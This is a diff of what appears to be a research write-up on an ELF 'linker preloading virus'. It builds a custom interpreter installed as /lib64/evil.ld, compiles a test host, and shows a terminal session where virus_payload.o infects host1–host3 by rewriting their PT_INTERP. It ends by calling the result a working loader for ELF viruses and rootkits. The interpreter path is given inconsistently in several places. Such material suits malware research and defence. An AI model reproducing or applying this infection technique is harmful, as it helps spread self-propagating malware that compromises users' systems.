@@ -515,59 +515,109 @@ Once control is passed to the RTLD our work is done. The RTLD will handle any re
 loading shared objects and patching the target executable. RTLD will then transfer control to the
 executable's entry point.
 
--= Building our interpreter
+-= Compiling and linking our interpreter
 
 We build the interpreter itself as a statically linked executable with a base
 text address of 0xa0000000 as specified by a custom linker script. The
 interpreter is a standard ET_EXEC ELF executable, and is statically linked with
-musl-libc and a slightly modified version of libelfmaster.
+musl-libc and a slightly modified version of libelfmaster. For our immediate
+test and research purposes this was ideal, however the interpreter can also
+be built as a PIE executable or a shared library like the RTLD.
 
-A note on symbol resolution:
+- A note on symbol resolution:
 
-	When our virus_payload.c code attempts to call musl-libc functions that aren't
-	in the symbol table of our ELF interpreter they will fail to be resolved.
-	All of the musl-libc functions that are not being used by the Interpreter will
-	not be included in it's symbol table, which we rely on for module
-	symbol resolution. A workaround solution is to just include every libc symbol
-	being invoked by your module code into the Makefile for the interpreter using
-	the ld flag '-undefined=<symbol>'.
+When our virus_payload.c code attempts to call musl-libc functions that aren't
+in the symbol table of our ELF interpreter they will fail to be resolved.
+All of the musl-libc functions that are not being used by the Interpreter will
+not be included in it's symbol table, which we rely on for module
+symbol resolution. A workaround solution is to just include every libc symbol
+being invoked by your module code into the Makefile for the interpreter using
+the ld flag '-undefined=<symbol>'.
 
------------- Interpreter Makefile ---------------
+- Building a test program
 
-INTERP_PATH="/lib64/evil.ld"
-GCC_OPTS=-DDEBUG -D_GNU_SOURCE -fPIC -nostdlib -c
+We must have a test program who's Interpreter is "/lib64/ld.evil". See the gcc
+flag '--dynamic-linker=':
 
-CC=musl-gcc
-all:
-        $(CC) $(GCC_OPTS) lp_interp.c -o lp_interp.o
-        $(CC) $(GCC_OPTS) lp_iter.c -o lp_iter.o
-        $(CC) $(GCC_OPTS) lp_util.c -o lp_util.o
-        $(CC) $(GCC_OPTS) lp_proc.c -o lp_proc.o
-        $(CC) $(GCC_OPTS) lp_parse_elf.c -o lp_parse_elf.o
-        $(CC) $(GCC_OPTS) libelfmaster.c -o libelfmaster.o
-        $(CC) $(GCC_OPTS) internal.c -o internal.o
-        $(CC) $(GCC_OPTS) lp_load_ldso.c -o lp_load_ldso.o
-        $(CC) $(GCC_OPTS) lp_loader.c -o lp_loader.o
-        $(CC) -D_GNU_SOURCE -Wl,-undefined=printf -Wl,-undefined=readdir -Wl,-undefined=opendir -T ./ld.script -static -g lp_interp.o lp_util.o \
-                lp_proc.o lp_iter.o lp_parse_elf.o lp_load_ldso.o lp_loader.o \
-                libelfmaster.o internal.o -o lp_interp
-        mkdir -p /opt/evil_linker/
-        cp lp_interp /lib64/evil.ld
-tests:
         gcc -ggdb -Wl,--dynamic-linker=$(INTERP_PATH) test.c -o test
-virus:
-        gcc -c virus_payload.c -fno-stack-protector
-        cp virus_payload.o virus_test/
-        cp test virus_test/
-clean:
-        rm -f lp_interp *.o
 
------------------------------------------------
+See the Makefile: https://github.com/elfmaster/linker_preloading_virus/blob/main/Makefile
+
+Our test program simply prints a string to printf, however it's PT_INTERP
+segment will instruct the kernel to use our custom "/lib/evil.ld" interpreter
+instead of the standard RTLD.
+
+$ cat test.c
+
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(int argc, char **argv)
+{
+	printf("I am 'test'. The Host binary of the linker virus\n");
+	exit(0);
+}
+
+$ readelf -l test | grep interpreter
+      [Requesting program interpreter: /lib64/evil.ld]
 
 
 
+-= Testing our Virus code
+
+We now have all of the working parts for a modular Virus loading system. We have an
+evil linker that loads and executes a Virus payload. The Virus payload infects other
+ELF binaries by modifying the PT_INTERP path to "/lib64/evil.ld".
 
 
+$ ls -l ./virus_test/
+total 96
+-rwxrwxr-x 1 elfmaster elfmaster    72 Dec  9 15:26 build.sh
+-rwxrwxr-x 1 elfmaster elfmaster 16728 Dec  9 15:47 host1
+-rwxrwxr-x 1 elfmaster elfmaster 16728 Dec  9 15:47 host2
+-rwxrwxr-x 1 elfmaster elfmaster 16728 Dec  9 15:47 host3
+-rw-rw-r-- 1 elfmaster elfmaster    95 Dec  9 15:26 host.c
+-rwxrwxr-x 1 elfmaster elfmaster 19336 Dec  9 15:26 test
+-rw-rw-r-- 1 elfmaster elfmaster  4544 Dec  9 15:26 virus_payload.o
+$
 
+The ELF executable 'test' will launch /lib64/evil.ld, and in turn it will link, load
+and execute virus_payload.o
+
+The virus_payload.o reads the current working directory and looks for other ELF binaries
+to infect: host1, host2, host3
+
+Let's take a quick look at the interpreter path in 'host1' before we run 'test'.
+
+$ readelf -l host1 | grep interpreter
+      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
+
+
+Now let us run 'test' and see what it's effects on the other binaries in the directory are...
+
+$ cd virus_test
+$ ./test
+[!] Module: 'virus_payload.o' linker preloading virus
+Attempting to infect 'host3'
+Updating the PT_INTERP with '/lib64/evil.ld'
+Successfully infected file 'host3'
+Attempting to infect 'host2'
+Updating the PT_INTERP with '/lib64/evil.ld'
+Successfully infected file 'host2'
+Attempting to infect 'host1'
+Updating the PT_INTERP with '/lib64/evil.ld'
+Successfully infected file 'host1'
+I am 'test'. The Host binary of the linker virus
+$
+
+As we can see from the output above our evil linker was preloaded by the kernel,
+and it successfully loaded an executed the module 'virus_payload.o'. The other ELF
+binaries within the CWD are infected by PT_INTERP modification.
+
+$ readelf -l host1 | grep interpreter
+      [Requesting program interpreter: /lib64/evil.ld]
+
+We have now demonstrated a fully functional modular runtime loader for ELF viruses
+and process memory rootkits.
 
 
